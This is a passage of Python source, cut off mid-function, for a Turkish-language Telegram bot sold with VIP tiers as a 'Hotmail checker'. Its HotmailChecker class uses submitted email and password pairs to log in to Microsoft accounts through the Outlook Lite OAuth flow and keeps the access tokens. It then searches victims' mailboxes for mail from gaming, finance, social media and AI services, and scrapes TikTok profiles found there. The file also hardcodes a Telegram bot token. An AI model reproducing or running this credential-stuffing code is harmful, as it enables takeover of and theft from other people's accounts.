HOTMAIL CHECKER TELEGRAM BOT - AMERİKA
Created by: @voidsafarov
✅ TikTok Full Capture (Sadece VIP)
✅ AI Platform Kontrolü (Ücretsiz)
✅ Ban Sistemi
✅ Gelişmiş İstatistikler
✅ Durdurma Butonu
✅ Tüm Önceki Özellikler
"""

import telebot
from telebot import types
import sqlite3
import os
import time
import threading
import datetime
import json
import requests
import uuid
import re
import urllib.parse
from pathlib import Path

# TikTok Capture Modülü
USER_AGENTS_TIKTOK = [
    'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

def format_number(num):
    """Büyük sayıları formatla"""
    if num >= 1000000:
        return f"{num/1000000:.1f}M"
    elif num >= 1000:
        return f"{num/1000:.1f}K"
    else:
        return str(num)

# Bot Konfigürasyonu
BOT_TOKEN = "8787890167:AAE9jILCx1S0m40cOEb0Oz9_j53nCag6h6A"
ADMIN_ID = 8446478484
MY_SIGNATURE = "@voidsafarov"
CHANNEL ="t.me/amerikatehlike"

bot = telebot.TeleBot(BOT_TOKEN)

# Kullanıcı oturum deposu
user_sessions = {}
active_scans = {}  # Aktif taramaları takip et (durdurma için)

# Servis Konfigürasyonu
SERVICES_ALL = {
    # Sosyal Medya
    "Facebook": "security@facebookmail.com",
    "Instagram": "security@mail.instagram.com",
    "TikTok": "register@account.tiktok.com",
    "Twitter": "info@x.com",
    "LinkedIn": "security-noreply@linkedin.com",
    "Snapchat": "no-reply@accounts.snapchat.com",
    
    # Yayın
    "Netflix": "info@account.netflix.com",
    "Spotify": "no-reply@spotify.com",
    "Disney+": "no-reply@disneyplus.com",
    "Hulu": "account@hulu.com",
    "YouTube": "no-reply@youtube.com",
    
    # Oyun
    "Steam": "noreply@steampowered.com",
    "Xbox": "xboxreps@engage.xbox.com",
    "PlayStation": "reply@txn-email.playstation.com",
    "Epic Games": "help@acct.epicgames.com",
    "Roblox": "accounts@roblox.com",
    "Free Fire": "no-reply@garena.com",
    "PUBG Mobile": "noreply@pubgmobile.com",
    "Konami": "noreply@konami.net",
    
    # Finans
    "PayPal": "service@paypal.com.br",
    "Binance": "do-not-reply@ses.binance.com",
    "Coinbase": "no-reply@coinbase.com",
}

SERVICES_GAMING = {
    "Steam": "noreply@steampowered.com",
    "Xbox": "xboxreps@engage.xbox.com",
    "PlayStation": "reply@txn-email.playstation.com",
    "Epic Games": "help@acct.epicgames.com",
    "EA Sports": "EA@e.ea.com",
    "Ubisoft": "noreply@ubisoft.com",
    "Riot Games": "no-reply@riotgames.com",
    "Roblox": "accounts@roblox.com",
    "Minecraft": "noreply@mojang.com",
    "Free Fire": "no-reply@garena.com",
    "PUBG Mobile": "noreply@pubgmobile.com",
    "Konami": "noreply@konami.net",
}

SERVICES_SOCIAL = {
    "Facebook": "security@facebookmail.com",
    "Instagram": "security@mail.instagram.com",
    "TikTok": "register@account.tiktok.com",
    "Twitter": "info@x.com",
    "LinkedIn": "security-noreply@linkedin.com",
    "Snapchat": "no-reply@accounts.snapchat.com",
    "Discord": "noreply@discord.com",
}

SERVICES_STREAMING = {
    "Netflix": "info@account.netflix.com",
    "Spotify": "no-reply@spotify.com",
    "Disney+": "no-reply@disneyplus.com",
    "Hulu": "account@hulu.com",
    "HBO Max": "no-reply@hbomax.com",
    "Amazon Prime": "auto-confirm@amazon.com",
    "YouTube": "no-reply@youtube.com",
    "Twitch": "no-reply@twitch.tv",
}

# AI Platformları (Herkes için ücretsiz)
SERVICES_AI = {
    "ChatGPT": "support@openai.com",
    "Claude AI": "support@anthropic.com",
    "Gemini": "ai-support@google.com",
    "DeepSeek": "support@deepseek.com",
    "Blackbox AI": "support@blackbox.ai",
    "Perplexity": "support@perplexity.ai",
    "Meta AI": "ai@meta.com",
    "Copilot": "copilot@microsoft.com",
    "Stability AI": "support@stability.ai",
}

# Veritabanı Kurulumu
def init_db():
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    
    # Kullanıcılar tablosu
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        is_vip INTEGER DEFAULT 0,
        vip_until TEXT,
        is_banned INTEGER DEFAULT 0,
        ban_reason TEXT,
        referral_code TEXT UNIQUE,
        referred_by INTEGER,
        referrals_count INTEGER DEFAULT 0,
        last_scan_time TEXT,
        total_scans INTEGER DEFAULT 0,
        total_hits INTEGER DEFAULT 0,
        join_date TEXT
    )''')
    
    # Tarama geçmişi
    c.execute('''CREATE TABLE IF NOT EXISTS scans (
        scan_id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        scan_date TEXT,
        scan_mode TEXT,
        hits_count INTEGER,
        bad_count INTEGER,
        total_checked INTEGER
    )''')
    
    conn.commit()
    conn.close()

init_db()

# Veritabanı Yardımcı Fonksiyonları
def get_user(user_id):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def add_user(user_id, username):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    
    user = get_user(user_id)
    if not user:
        referral_code = f"REF{user_id}"
        c.execute("""INSERT INTO users (user_id, username, referral_code, join_date) 
                     VALUES (?, ?, ?, ?)""", 
                  (user_id, username, referral_code, str(datetime.datetime.now())))
        conn.commit()
    conn.close()

def add_vip_hours(user_id, hours):
    """VIP saati ekle (referral sistemi için)"""
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    
    user = get_user(user_id)
    if not user:
        return False
    
    current_vip = user[3]  # vip_until
    now = datetime.datetime.now()
    
    if current_vip == "Forever":
        new_vip = "Forever"
    elif current_vip:
        try:
            vip_date = datetime.datetime.strptime(current_vip, "%Y-%m-%d %H:%M:%S")
            if vip_date > now:
                new_vip = vip_date + datetime.timedelta(hours=hours)
            else:
                new_vip = now + datetime.timedelta(hours=hours)
        except:
            new_vip = now + datetime.timedelta(hours=hours)
    else:
        new_vip = now + datetime.timedelta(hours=hours)
    
    c.execute("UPDATE users SET is_vip = 1, vip_until = ? WHERE user_id = ?", 
              (str(new_vip), user_id))
    conn.commit()
    conn.close()
    return True

def process_referral(new_user_id, referrer_user_id):
    """Referral işlemi - Referrer'a 1 saat VIP ver"""
    if referrer_user_id == new_user_id:
        return False
    
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    
    new_user = get_user(new_user_id)
    if new_user and new_user[7]:  # referred_by zaten ayarlanmış
        conn.close()
        return False
    
    c.execute("UPDATE users SET referred_by = ? WHERE user_id = ?", 
              (referrer_user_id, new_user_id))
    
    c.execute("UPDATE users SET referrals_count = referrals_count + 1 WHERE user_id = ?", 
              (referrer_user_id,))
    
    conn.commit()
    conn.close()
    
    add_vip_hours(referrer_user_id, 1)
    return True

def is_banned(user_id):
    """Kullanıcının yasaklı olup olmadığını kontrol et"""
    if user_id == ADMIN_ID:
        return False
    
    user = get_user(user_id)
    if not user:
        return False
    
    return user[4] == 1  # is_banned sütunu

def ban_user(user_id, reason="Sebep belirtilmedi"):
    """Kullanıcıyı yasakla"""
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 1, ban_reason = ? WHERE user_id = ?", 
              (reason, user_id))
    conn.commit()
    conn.close()

def unban_user(user_id):
    """Kullanıcının yasağını kaldır"""
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 0, ban_reason = NULL WHERE user_id = ?", 
              (user_id,))
    conn.commit()
    conn.close()

def get_banned_users():
    """Yasaklı kullanıcı listesini al"""
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT user_id, username, ban_reason FROM users WHERE is_banned = 1")
    banned = c.fetchall()
    conn.close()
    return banned

def is_vip(user_id):
    if user_id == ADMIN_ID:
        return True
    
    user = get_user(user_id)
    if not user:
        return False
    
    is_vip_flag = user[2]
    vip_until = user[3]
    
    if is_vip_flag == 0 or not is_vip_flag:
        return False
    
    if not vip_until or vip_until.strip() == "":
        conn = sqlite3.connect('bot_database.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("UPDATE users SET is_vip = 0 WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
        return False
    
    if vip_until == "Forever":
        return True
    
    try:
        vip_date = datetime.datetime.strptime(vip_until, "%Y-%m-%d %H:%M:%S")
        if datetime.datetime.now() < vip_date:
            return True
        else:
            conn = sqlite3.connect('bot_database.db', check_same_thread=False)
            c = conn.cursor()
            c.execute("UPDATE users SET is_vip = 0 WHERE user_id = ?", (user_id,))
            conn.commit()
            conn.close()
            return False
    except Exception as e:
        conn = sqlite3.connect('bot_database.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("UPDATE users SET is_vip = 0 WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
        return False

def is_vip_forever(user_id):
    """Kullanıcının SONSUZ VIP'i olup olmadığını kontrol et (TikTok Full Capture için)"""
    if user_id == ADMIN_ID:
        return True
    
    user = get_user(user_id)
    if not user:
        return False
    
    vip_until = user[3]
    return vip_until == "Forever"

def can_scan(user_id):
    """Kullanıcının tarama yapıp yapamayacağını kontrol et"""
    if is_vip(user_id):
        return True, None
    
    user = get_user(user_id)
    if not user or not user[6]:  # last_scan_time
        return True, None
    
    try:
        last_scan = datetime.datetime.strptime(user[6], "%Y-%m-%d %H:%M:%S")
        now = datetime.datetime.now()
        diff = (now - last_scan).total_seconds()
        
        if diff >= 3600:
            return True, None
        else:
            remaining = int(3600 - diff)
            minutes = remaining // 60
            seconds = remaining % 60
            return False, f"{minutes}d {seconds}s"
    except:
        return True, None

def update_last_scan(user_id):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE users SET last_scan_time = ? WHERE user_id = ?", 
              (str(datetime.datetime.now()), user_id))
    conn.commit()
    conn.close()

def add_vip(user_id, username, duration):
    """VIP üyeliği ekle"""
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    
    user = get_user(user_id)
    if not user:
        add_user(user_id, username)
    
    if duration == "Forever":
        vip_until = "Forever"
    else:
        now = datetime.datetime.now()
        if duration == "1h":
            vip_until = now + datetime.timedelta(hours=1)
        elif duration == "1d":
            vip_until = now + datetime.timedelta(days=1)
        elif duration == "1w":
            vip_until = now + datetime.timedelta(weeks=1)
        elif duration == "1m":
            vip_until = now + datetime.timedelta(days=30)
        else:
            vip_until = "Forever"
        
        vip_until = str(vip_until)
    
    c.execute("UPDATE users SET is_vip = 1, vip_until = ? WHERE user_id = ?", 
              (vip_until, user_id))
    conn.commit()
    conn.close()

def remove_vip(user_id):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("UPDATE users SET is_vip = 0, vip_until = NULL WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def get_all_vips():
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT user_id, username, vip_until FROM users WHERE is_vip = 1")
    vips = c.fetchall()
    conn.close()
    return vips

def get_free_users():
    """Ücretsiz kullanıcı listesini al"""
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT user_id, username FROM users WHERE is_vip = 0 AND is_banned = 0")
    free_users = c.fetchall()
    conn.close()
    return free_users

def update_stats(user_id, hits, bad, total):
    conn = sqlite3.connect('bot_database.db', check_same_thread=False)
    c = conn.cursor()
    
    c.execute("UPDATE users SET total_scans = total_scans + 1, total_hits = total_hits + ? WHERE user_id = ?", 
              (hits, user_id))
    
    conn.commit()
    conn.close()

# Ana Menü Klavyesi
def main_menu_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    btn1 = types.KeyboardButton("📋 Tarama Başlat")
    btn2 = types.KeyboardButton("📦 Çoklu Tarama")
    btn3 = types.KeyboardButton("📊 İstatistiklerim")
    btn4 = types.KeyboardButton("👑 Üyelik")
    btn5 = types.KeyboardButton("🔗 Referral Linkim")
    btn6 = types.KeyboardButton("📞 Destek")
    
    if user_id == ADMIN_ID:
        btn7 = types.KeyboardButton("🔧 Admin Paneli")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7)
    else:
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    
    return markup

# Tarama Modu Seçimi
def scan_mode_keyboard(user_id):
    """Tek Hesap Kontrolü ve Instagram Full ile geliştirilmiş tarama modu"""
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    btn1 = types.InlineKeyboardButton("1️⃣ Tüm Servisler", callback_data="scan_all")
    btn2 = types.InlineKeyboardButton("2️⃣ Tek Platform Seç", callback_data="scan_single_platform")
    btn3 = types.InlineKeyboardButton("3️⃣ Oyun Platformları", callback_data="scan_gaming")
    btn4 = types.InlineKeyboardButton("4️⃣ Sosyal Medya", callback_data="scan_social")
    btn5 = types.InlineKeyboardButton("5️⃣ Yayın Servisleri", callback_data="scan_streaming")
    btn6 = types.InlineKeyboardButton("6️⃣ PSN Detaylı", callback_data="scan_psn")
    btn7 = types.InlineKeyboardButton("7️⃣ Özel Domain", callback_data="scan_custom")
    btn8 = types.InlineKeyboardButton("8️⃣ AI Platformları (Ücretsiz)", callback_data="scan_ai")
    
    # TikTok Full Capture - Sadece SONSUZ VIP
    if is_vip_forever(user_id):
        btn9 = types.InlineKeyboardButton("9️⃣ TikTok Full Capture (Sonsuz VIP)", callback_data="scan_tiktok")
    else:
        btn9 = types.InlineKeyboardButton("🔒 TikTok Full (Sadece Sonsuz VIP)", callback_data="vip_forever_required")
    
    # YENİ: Tek Hesap Kontrol
    btn10 = types.InlineKeyboardButton("🔟 Tek Hesap Kontrol", callback_data="scan_check_one")
    
    # YENİ: Instagram Full Capture - Sadece VIP
    if is_vip(user_id):
        btn11 = types.InlineKeyboardButton("1️⃣1️⃣ Instagram Full Capture (VIP)", callback_data="scan_instagram_full")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10, btn11)
    else:
        btn11 = types.InlineKeyboardButton("🔒 Instagram Full (Sadece VIP)", callback_data="vip_required")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10, btn11)
    
    btn_back = types.InlineKeyboardButton("◀️ Geri", callback_data="back_main")
    markup.add(btn_back)
    
    return markup


def single_platform_keyboard():
    """Platform seçim klavyesi - Kaynaktaki tüm platformlar"""
    markup = types.InlineKeyboardMarkup(row_width=3)
    
    all_platforms = {}
    
    for name, email in SERVICES_ALL.items():
        all_platforms[name] = email
    
    for name, email in SERVICES_GAMING.items():
        if name not in all_platforms:
            all_platforms[name] = email
    
    for name, email in SERVICES_SOCIAL.items():
        if name not in all_platforms:
            all_platforms[name] = email
    
    for name, email in SERVICES_STREAMING.items():
        if name not in all_platforms:
            all_platforms[name] = email
    
    for name, email in SERVICES_AI.items():
        if name not in all_platforms:
            all_platforms[name] = email
    
    platform_buttons = []
    for platform_name in sorted(all_platforms.keys()):
        btn_text = platform_name
        btn_data = f"platform_{platform_name}"
        platform_buttons.append(types.InlineKeyboardButton(btn_text, callback_data=btn_data))
    
    for i in range(0, len(platform_buttons), 3):
        row = platform_buttons[i:i+3]
        markup.row(*row)
    
    back_btn = types.InlineKeyboardButton("◀️ Geri", callback_data="back_to_scan_modes")
    markup.add(back_btn)
    
    return markup

def get_mode_description(mode):
    """Her tarama modu için detaylı açıklama"""
    descriptions = {
        "all": """
⚡ <b>TÜM SERVİSLER TARAMASI</b>

📝 <b>Açıklama:</b>
60+ platformda bağlı tüm hesapları kontrol et

🎯 <b>Desteklenen Platformlar:</b>
• 📱 Sosyal: Facebook, Instagram, TikTok, Twitter, LinkedIn
• 🎮 Oyun: Steam, Xbox, PSN, Epic, Free Fire, PUBG, Konami
• 📺 Yayın: Netflix, Spotify, Disney+, Hulu, HBO Max
• 💰 Finans: PayPal, Binance, Coinbase
• Ve 40+ daha fazlası!

⏱ <b>Tahmini Süre:</b> Orta-Uzun
🎯 <b>En İyi Kullanım:</b> Tam hesap analizi
""",
        "gaming": """
⚡ <b>OYUN PLATFORMLARI TARAMASI</b>

📝 <b>Açıklama:</b>
Sadece oyun hesaplarını kontrol et - daha hızlı ve odaklı

🎮 <b>Desteklenen Platformlar:</b>
• Steam, Xbox, PlayStation, Epic Games
• EA Sports, Ubisoft, Riot Games
• Roblox, Minecraft
• Free Fire, PUBG Mobile, Konami

⏱ <b>Tahmini Süre:</b> Hızlı
🎯 <b>En İyi Kullanım:</b> Oyun hesabı avcıları
""",
        "social": """
⚡ <b>SOSYAL MEDYA TARAMASI</b>

📝 <b>Açıklama:</b>
Sadece sosyal medya hesaplarını kontrol et

📱 <b>Desteklenen Platformlar:</b>
• Facebook, Instagram, TikTok
• Twitter, LinkedIn, Snapchat
• Discord, Reddit

⏱ <b>Tahmini Süre:</b> Hızlı
🎯 <b>En İyi Kullanım:</b> Sosyal medya avcıları
""",
        "streaming": """
⚡ <b>YAYIN SERVİSLERİ TARAMASI</b>

📝 <b>Açıklama:</b>
Yayın ve eğlence hesaplarını kontrol et

📺 <b>Desteklenen Platformlar:</b>
• Netflix, Spotify, Disney+
• Hulu, HBO Max, Amazon Prime
• YouTube Premium, Twitch

⏱ <b>Tahmini Süre:</b> Hızlı
🎯 <b>En İyi Kullanım:</b> Eğlence avcıları
""",
        "psn": """
⚡ <b>PSN DETAYLI TARAMA</b>

📝 <b>Açıklama:</b>
Derin PlayStation Network analizi

🎯 <b>Neler Elde Edersiniz:</b>
• PSN doğrulaması
• Sipariş geçmişi
• Online ID çıkarma
• Hesap bölgesi

⏱ <b>Tahmini Süre:</b> Orta
🎯 <b>En İyi Kullanım:</b> PlayStation odaklı
""",
        "custom": """
⚡ <b>ÖZEL DOMAİN TARAMASI</b>

📝 <b>Açıklama:</b>
Herhangi bir servisi domain ile ara

🔍 <b>Nasıl Çalışır:</b>
Domain sağla (ör. netflix.com)
Bot o domainden e-postaları arar

⏱ <b>Tahmini Süre:</b> Hızlı
🎯 <b>En İyi Kullanım:</b> Belirli servisler
""",
        "ai": """
⚡ <b>AI PLATFORMLARI TARAMASI</b> 🆕

📝 <b>Açıklama:</b>
AI platform hesaplarını kontrol et (ÜCRETSİZ!)

🤖 <b>Desteklenen Platformlar:</b>
• ChatGPT (OpenAI)
• Claude AI (Anthropic)
• Gemini (Google)
• DeepSeek AI
• Blackbox AI
• Perplexity AI
• Meta AI (LLaMA)
• Microsoft Copilot
• Stability AI

⏱ <b>Tahmini Süre:</b> Hızlı
🎯 <b>En İyi Kullanım:</b> AI hesabı avcıları
💎 <b>Durum:</b> Herkes için ÜCRETSİZ!
""",
        "tiktok": """
⚡ <b>TIKTOK FULL CAPTURE</b> 🆕

📝 <b>Açıklama:</b>
Tam TikTok hesap verisi çıkarma

🎯 <b>Neler Elde Edersiniz:</b>
• TikTok Kullanıcı Adı
• Takipçi Sayısı
• Takip Edilen Sayısı
• Toplam Video
• Toplam Beğeni
• Profil Biyografisi
• Doğrulama Durumu
• Hesap Oluşturma Tarihi

⏱ <b>Tahmini Süre:</b> Orta
🎯 <b>En İyi Kullanım:</b> TikTok avcıları
👑 <b>Durum:</b> SADECE VIP
"""
    }
    
    return descriptions.get(mode, "")

# Admin Paneli
def admin_panel_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    # VIP Yönetimi
    btn1 = types.InlineKeyboardButton("➕ VIP Ekle", callback_data="admin_add_vip")
    btn2 = types.InlineKeyboardButton("➖ VIP Kaldır", callback_data="admin_remove_vip")
    btn3 = types.InlineKeyboardButton("📋 VIP Listesi", callback_data="admin_list_vips")
    
    # Ban Yönetimi
    btn4 = types.InlineKeyboardButton("🚫 Kullanıcı Yasakla", callback_data="admin_ban_user")
    btn5 = types.InlineKeyboardButton("✅ Yasak Kaldır", callback_data="admin_unban_user")
    btn6 = types.InlineKeyboardButton("📋 Yasaklı Liste", callback_data="admin_banned_list")
    
    # İstatistikler
    btn7 = types.InlineKeyboardButton("📊 Bot İstatistikleri", callback_data="admin_stats")
    btn8 = types.InlineKeyboardButton("📢 Duyuru Gönder", callback_data="admin_broadcast")
    
    btn_back = types.InlineKeyboardButton("◀️ Geri", callback_data="back_main")
    
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn_back)
    return markup

# VIP Süre Seçimi
def vip_duration_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    btn1 = types.InlineKeyboardButton("⏱ 1 Saat", callback_data="vip_duration_1h")
    btn2 = types.InlineKeyboardButton("📅 1 Gün", callback_data="vip_duration_1d")
    btn3 = types.InlineKeyboardButton("📆 1 Hafta", callback_data="vip_duration_1w")
    btn4 = types.InlineKeyboardButton("🗓 1 Ay", callback_data="vip_duration_1m")
    btn5 = types.InlineKeyboardButton("♾️ Sonsuz", callback_data="vip_duration_forever")
    btn_back = types.InlineKeyboardButton("◀️ İptal", callback_data="admin_panel")
    
    markup.add(btn1, btn2, btn3, btn4, btn5, btn_back)
    return markup

# İlerleme Mesajı için Durdurma Butonu
def stop_scan_keyboard(user_id):
    markup = types.InlineKeyboardMarkup()
    btn_stop = types.InlineKeyboardButton("⏹ Taramayı Durdur", callback_data=f"stop_scan_{user_id}")
    markup.add(btn_stop)
    return markup

# =====================================================
# HOTMAIL CHECKER MOTORU
# =====================================================

class HotmailChecker:
    """Gerçek Hotmail/Outlook Checker"""
    
    @staticmethod
    def check_account(email, password):
        """Hesabın geçerli olup olmadığını kontrol et"""
        try:
            session = requests.Session()
            
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N)",
            }
            
            r1 = session.get(url1, headers=headers1, timeout=10)
            
            if "MSAccount" not in r1.text:
                return {"status": "BAD"}
            
            params = {
                "client_info": "1",
                "haschrome": "1",
                "login_hint": email,
                "mkt": "en",
                "response_type": "code",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
            }
            
            url_auth = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
            r2 = session.get(url_auth, timeout=10)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                return {"status": "BAD"}
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&i19=9960"
            
            r3 = session.post(post_url, data=login_data, headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0"
            }, allow_redirects=False, timeout=10)
            
            if "password is incorrect" in r3.text.lower() or "error" in r3.text.lower():
                return {"status": "BAD"}
            
            location = r3.headers.get("Location", "")
            if not location or "code=" not in location:
                return {"status": "BAD"}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}
            
            code = code_match.group(1)
            
            token_data = {
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                            data=token_data, timeout=10)
            
            if "access_token" not in r4.text:
                return {"status": "BAD"}
            
            token_json = r4.json()
            access_token = token_json["access_token"]
            
            mspcid = None
            for cookie in session.cookies:
                if cookie.name == "MSPCID":
                    mspcid = cookie.value.upper()
                    break
            
            if not mspcid:
                mspcid = str(uuid.uuid4()).upper()
            
            return {
                "status": "HIT",
                "token": access_token,
                "cid": mspcid
            }
            
        except:
            return {"status": "RETRY"}
    
    @staticmethod
    def check_services(email, password, token, cid, services_dict):
        """Bağlı servisleri kontrol et"""
        found_services = []
        
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Accept": "application/json",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com"
            }
            
            for service_name, sender_email in services_dict.items():
                try:
                    payload = {
                        "Cvid": str(uuid.uuid4()),
                        "Scenario": {"Name": "owa.react"},
                        "TimeZone": "UTC",
                        "TextDecorations": "Off",
                        "EntityRequests": [{
                            "EntityType": "Conversation",
                            "ContentSources": ["Exchange"],
                            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                            "From": 0,
                            "Query": {"QueryString": f"from:{sender_email}"},
                            "Size": 1,
                            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                        }]
                    }
                    
                    r = requests.post(search_url, json=payload, headers=headers, timeout=8)
                    
                    if r.status_code == 200:
                        data = r.json()
                        if 'EntitySets' in data:
                            for entity_set in data['EntitySets']:
                                if 'ResultSets' in entity_set:
                                    for result_set in entity_set['ResultSets']:
                                        total = result_set.get('Total', 0)
                                        if total > 0:
                                            found_services.append(service_name)
                                            break
                    
                    time.sleep(0.1)
                except:
                    continue
            
            return found_services
        except:
            return found_services
    
    @staticmethod
    def check_tiktok_full(email, password, token, cid):
        """TikTok Full Capture - Tam TikTok verisi çıkar"""
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Accept": "application/json",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
            }
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Message",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": "tiktok"},
                    "Size": 25,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            
            r = requests.post(search_url, json=payload, headers=headers, timeout=15)
            
            if r.status_code != 200:
                return None
            
            search_text = r.text
            
            tiktok_senders = [
                "no-reply@shop.tiktok.com",
                "notification@service.tiktok.com",
                "noreply@account.tiktok.com",
                "register@account.tiktok.com",
                "no-reply@tiktok.com",
            ]
            
            tiktok_count = 0
            for sender in tiktok_senders:
                tiktok_count += search_text.count(sender)
            
            if tiktok_count == 0:
                return None
            
            username_patterns = [
                r'(?i)this\s+email\s+was\s+generated\s+for\s+@?([a-zA-Z0-9_\.]{2,30})',
                r'(?i)Hi\s+@?([a-zA-Z0-9_\.]{2,30})',
                r'(?i)Hello\s+@?([a-zA-Z0-9_\.]{2,30})',
                r'@([a-zA-Z0-9_\.]{2,30})',
            ]
            
            username = None
            for pattern in username_patterns:
                match = re.search(pattern, search_text)
                if match:
                    potential_username = match.group(1)
                    if not any(x in potential_username.lower() for x in ['tiktok', 'mail', 'email', 'hotmail', 'outlook']):
                        username = potential_username
                        break
            
            if not username:
                return {
                    "has_tiktok": True,
                    "tiktok_emails": tiktok_count,
                    "username": "Bilinmiyor",
                    "followers": 0,
                    "following": 0,
                    "videos": 0,
                    "likes": 0,
                    "verified": False
                }
            
            try:
                import random
                headers_tiktok = {
                    'user-agent': random.choice(USER_AGENTS_TIKTOK),
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                }
                
                url = f"https://www.tiktok.com/@{username}"
                response = requests.get(url, headers=headers_tiktok, timeout=10, verify=False)
                
                if response.status_code == 200:
                    html = response.text
                    
                    profile_data = {
                        "has_tiktok": True,
                        "tiktok_emails": tiktok_count,
                        "username": username,
                        "followers": 0,
                        "following": 0,
                        "videos": 0,
                        "likes": 0,
                        "verified": False
                    }
                    
                    json_pattern = r'<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__" type="application/json">(.*?)</script>'
                    json_match = re.search(json_pattern, html, re.DOTALL)
                    
                    if json_match:
                        try:
                            data = json.loads(json_match.group(1))
                            user_detail = data.get('__DEFAULT_SCOPE__', {}).get('webapp.user-detail', {}).get('userInfo', {})
                            user = user_detail.get('user', {})
                            stats = user_detail.get('stats', {})
                            
                            profile_data['followers'] = stats.get('followerCount', 0)
                            profile_data['following'] = stats.get('followingCount', 0)
                            profile_data['likes'] = stats.get('heartCount', 0)
                            profile_data['videos'] = stats.get('videoCount', 0)
                            profile_data['verified'] = user.get('verified', False)
                        except:
                            pass
                    
                    if profile_data['followers'] == 0:
                        followers_match = re.search(r'"followerCount":(\d+)', html)
